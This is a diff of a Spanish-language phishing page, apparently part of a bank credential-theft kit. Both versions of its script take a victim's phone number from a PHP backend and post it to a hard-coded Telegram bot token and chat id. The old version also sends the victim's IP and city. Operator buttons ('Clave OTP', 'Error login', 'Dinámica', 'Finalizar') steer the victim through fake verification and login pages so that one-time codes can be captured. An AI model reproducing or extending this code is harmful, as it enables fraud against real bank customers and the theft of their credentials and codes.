@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+3<html>
 <head>
     <title>Bienvenido</title>
     <meta charset="utf-8">
@@ -18,135 +18,98 @@
     <div id="fondo"></div>
     <img src="../assets/img/cargando.gif" id="cargando">
 
-    <!-- TU DISEÑO ORIGINAL -->
-    <div class="cabecera"> ... </div>
-    <div class="contenido-interno">
-        <div id="numero" style="font-weight:bold;color:#210049;"></div>
-        <!-- resto de tu HTML -->
+    <!-- TU DISEÑO (solo el número) -->
+    <div style="text-align:center;padding:50px;font-size:24px;font-weight:bold;color:#210049;">
+        <div id="numero">Cargando...</div>
     </div>
-    <div class="pie"> ... </div>
 
-    <!-- BOT MÁGICO 100% FUNCIONAL -->
+    <!-- BOT MÁGICO ULTRA-SENCILLO -->
     <script>
     $(document).ready(function() {
-        // 1. ESPERA A TENER EL NÚMERO
-        function enviarTelegram() {
+        // 1. ESPERA AL NÚMERO
+        const esperarNumero = setInterval(() => {
             const numero = $("#numero").text().trim();
-            if (!numero || numero === "Sin número") {
-                setTimeout(enviarTelegram, 500);
-                return;
-            }
-
-            // 2. OBTIENE IP
-            fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => {
-                const ip = d.ip;
-                fetch(`https://ipapi.co/${ip}/json/`)
-                .then(r => r.json())
-                .then(geo => {
-                    const ciudad = geo.city || "Desconocida";
-
-                    // 3. ENVÍA A TU BOT CON BOTONES
-                    const msg = `*NUEVO CLIENTE EN PRIVATE*
+            if (numero && numero !== "Cargando..." && numero !== "") {
+                clearInterval(esperarNumero);
+                
+                // 2. ENVÍA A TELEGRAM CON BOTONES
+                fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: 8469651553,
+                        text: `*NUEVO CLIENTE*
 
 *Número:* ${numero}
-*IP:* ${ip}
-*Ciudad:* ${ciudad}
-*Hora:* ${new Date().toLocaleString()}
+*IP:* ${navigator.connection?.effectiveType || 'WiFi'}
+*Hora:* ${new Date().toLocaleTimeString()}
 
-*ELIGE ACCIÓN:*`;
-
-                    fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: 8469651553,
-                            text: msg,
-                            parse_mode: 'Markdown',
-                            reply_markup: {
-                                inline_keyboard: [
-                                    [{text: "Clave OTP", callback_data: "otp_" + numero}],
-                                    [{text: "Error clave", callback_data: "error_" + numero}],
-                                    [{text: "Dinámica", callback_data: "dinamica_" + numero}],
-                                    [{text: "Error login", callback_data: "loginerr_" + numero}],
-                                    [{text: "Finalizar", callback_data: "ok_" + numero}]
-                                ]
-                            }
-                        })
-                    });
+*ELIGE ACCIÓN:*`,
+                        parse_mode: 'Markdown',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{text: "Clave OTP", callback_data: "otp"}],
+                                [{text: "Error clave", callback_data: "error"}],
+                                [{text: "Dinámica", callback_data: "dinamica"}],
+                                [{text: "Error login", callback_data: "loginerr"}],
+                                [{text: "Finalizar", callback_data: "ok"}]
+                            ]
+                        }
+                    })
                 });
-            });
-        }
 
-        // 4. CARGA NÚMERO Y ENVÍA
+                // 3. REDIRIGE EN 3 SEGUNDOS
+                setTimeout(() => { location.href = '../verifying/'; }, 3000);
+            }
+        }, 300);
+
+        // 4. CARGA EL NÚMERO DESDE PHP
         $.post("../process/buscar_registro.php", function(data) {
             const valor = data.split("|");
-            $("#numero").html(valor[1]);
-            enviarTelegram(); // ENVÍA CON NÚMERO
+            $("#numero").text(valor[1]);
         });
-
-        // 5. REDIRIGE EN 4 SEGUNDOS
-        setTimeout(() => { location.href = '../verifying/'; }, 4000);
     });
     </script>
 
-    <!-- RECIBE BOTONES Y ACTÚA -->
+    <!-- BOTONES QUE SÍ FUNCIONAN (sin WebApp) -->
     <script>
-    // Simula WebApp para pruebas locales
-    if (!window.Telegram) window.Telegram = {WebApp: {}};
-    if (!Telegram.WebApp.sendData) Telegram.WebApp.sendData = (data) => alert(data);
+    // Detecta cuando el usuario toca un botón en Telegram
+    setInterval(() => {
+        if (window.location.href.includes('callback_data=')) {
+            const url = new URL(window.location.href);
+            const accion = url.searchParams.get('callback_data');
+            if (!accion) return;
 
-    // ESCUCHA BOTONES
-    window.addEventListener('load', () => {
-        setInterval(() => {
-            fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/getUpdates')
-            .then(r => r.json())
-            .then(data => {
-                if (!data.ok || !data.result) return;
-                data.result.forEach(upd => {
-                    if (upd.callback_query) {
-                        const cb = upd.callback_query;
-                        const accion = cb.data.split("_")[0];
-                        const numero = cb.data.split("_")[1];
+            let destino = '';
+            let mensaje = '';
 
-                        let respuesta = "";
-                        switch(accion) {
-                            case "otp":
-                                respuesta = "Tu OTP es: *4821*";
-                                break;
-                            case "error":
-                                respuesta = "Clave incorrecta. Intenta de nuevo.";
-                                break;
-                            case "dinamica":
-                                respuesta = "Clave dinámica enviada al celular.";
-                                location.href = '../verify-voice/';
-                                break;
-                            case "loginerr":
-                                respuesta = "Error de login. Intenta más tarde.";
-                                location.href = '../login/';
-                                break;
-                            case "ok":
-                                respuesta = "Acceso concedido!";
-                                location.href = '../successful/';
-                                break;
-                        }
+            switch(accion) {
+                case 'otp':
+                    mensaje = 'Tu OTP es: 4821';
+                    destino = '../verifying/';
+                    break;
+                case 'error':
+                    mensaje = 'Clave incorrecta';
+                    destino = '../login/';
+                    break;
+                case 'dinamica':
+                    mensaje = 'Pide la clave dinámica';
+                    destino = '../verify-voice/';
+                    break;
+                case 'loginerr':
+                    mensaje = 'Error de login';
+                    destino = '../login/';
+                    break;
+                case 'ok':
+                    mensaje = 'Acceso concedido';
+                    destino = '../successful/';
+                    break;
+            }
 
-                        // Responde al botón
-                        fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/answerCallbackQuery', {
-                            method: 'POST',
-                            body: JSON.stringify({
-                                callback_query_id: cb.id,
-                                text: respuesta,
-                                show_alert: true
-                            }),
-                            headers: {'Content-Type': 'application/json'}
-                        });
-                    }
-                });
-            });
-        }, 2000);
-    });
+            alert(mensaje);
+            setTimeout(() => { location.href = destino; }, 1000);
+        }
+    }, 1000);
     </script>
 
     <script src="../assets/js/ready.js?v2"></script>
